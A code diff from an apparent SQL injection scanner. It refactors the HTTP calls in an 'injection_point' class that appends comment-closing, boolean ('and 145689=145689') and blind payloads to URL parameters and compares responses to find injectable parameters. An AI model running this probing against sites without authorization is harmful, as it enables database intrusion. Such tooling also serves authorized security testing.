@@ -26,7 +26,7 @@ class injection_point():
 
 
     def reload_payloads(self, payloads):
-        if  requests.get(self.basicurl,headers = self.headers).status_code != 200:
+        if  self.page.request(self.basicurl,self.parameter,self.headers).status_code != 200:
             raise Exception("request is error!")
         for payload in payloads:
             for j in self.parameter.keys():
@@ -34,7 +34,7 @@ class injection_point():
                 param2 = self.parameter.copy()
                 param1[j] = param1[j] + payload
                 param2[j] = param2[j] + payload + "-- "
-                req = requests.get(self.urlpath,params=param1,headers = self.headers)
+                req = self.page.request(self.urlpath,param1,self.headers)
                 if  (not self.judge_page(self.urlpath,param1)) and self.judge_page(self.urlpath,param2):          #判断后缀加入闭合符号异常，再追加后缀正常判断注入点
                     self.injection_point, self.injection_url = j, req.url
                     self.output.info_inject(j)
@@ -48,8 +48,8 @@ class injection_point():
                 param2 = self.parameter.copy()
                 param1[j] = param1[j] + ' and 145689=145689'
                 param2[j] = param2[j] + ' and 145689=245689'
-                r1 = requests.get(self.urlpath,params=param1,headers = self.headers)
-                r2 = requests.get(self.urlpath,params=param2,headers = self.headers)
+                r1 = self.page.request(self.urlpath,param1,self.headers)
+                r2 = self.page.request(self.urlpath,param2,self.headers)
                 if self.judge_page(self.urlpath,param1) and not self.judge_page(self.urlpath,param2):
                     self.injection_point, self.injection_url = j, r1.url
                     self.output.info_inject(j)
@@ -65,8 +65,8 @@ class injection_point():
                     param2 = self.parameter.copy()
                     param1[j] = param1[j] + blind_payload[0]
                     param2[j] = param2[j] + blind_payload[1]
-                    r1 = requests.get(self.urlpath,params=param1,headers = self.headers)
-                    r2 = requests.get(self.urlpath,params=param2,headers = self.headers)
+                    r1 = self.page.request(self.urlpath,param1,self.headers)
+                    r2 = self.page.request(self.urlpath,param2,self.headers)
                     if self.judge_page(self.urlpath,param1) and not self.judge_page(self.urlpath,param2):
                         self.injection_point, self.injection_url = j, r1.url
                         self.output.info_inject(j)
@@ -75,9 +75,9 @@ class injection_point():
 
 
     def judge_page(self,url,param):
-        r = requests.get(self.urlpath,params=self.parameter,headers = self.headers)
+        r = self.page.request(self.urlpath,self.parameter,self.headers)
         rightpage = r.text
-        r1 = requests.get(url,params=param,headers = self.headers)
+        r1 = self.page.request(url,param,self.headers)
         returnpage = r1.text
         if rightpage == returnpage:
             return True
